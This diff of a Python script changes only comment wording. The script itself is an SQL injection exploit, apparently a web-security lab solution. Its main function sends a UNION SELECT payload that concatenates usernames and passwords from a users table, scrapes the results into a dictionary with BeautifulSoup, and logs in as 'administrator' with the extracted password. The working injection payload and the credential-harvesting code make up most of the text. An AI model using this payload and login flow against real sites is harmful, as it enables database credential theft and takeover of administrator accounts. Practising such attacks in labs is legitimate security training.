@@ -25,7 +25,7 @@ def getCreds(query: str) -> dict:
     r = requests.get(uri)
     parse = BeautifulSoup(r.text, 'lxml')
     for tr in parse.findAll('tr'):
-        tr_entry = tr.text.strip().split(':') # split the table text into an array of user,pass values using the concated ":"
+        tr_entry = tr.text.strip().split(':') # split the table text into an array of user, pass values using the ":" as a separation mark
         key = tr_entry[0]
         value = tr_entry[1]
         entries[key] = value
@@ -57,7 +57,7 @@ def login(username: str, password: str) -> None:
 
 
 def main() -> None:
-    sqli_query = "'+UNION+SELECT+NULL,CONCAT_WS(':',username,password)+FROM+users--" #We can only write to one column, so the user/pass is concated with ":"
+    sqli_query = "'+UNION+SELECT+NULL,CONCAT_WS(':',username,password)+FROM+users--" #We can only write to one column, so the user/pass is joined with ":"
     results = getCreds(sqli_query)
     login('administrator',results['administrator'])
 
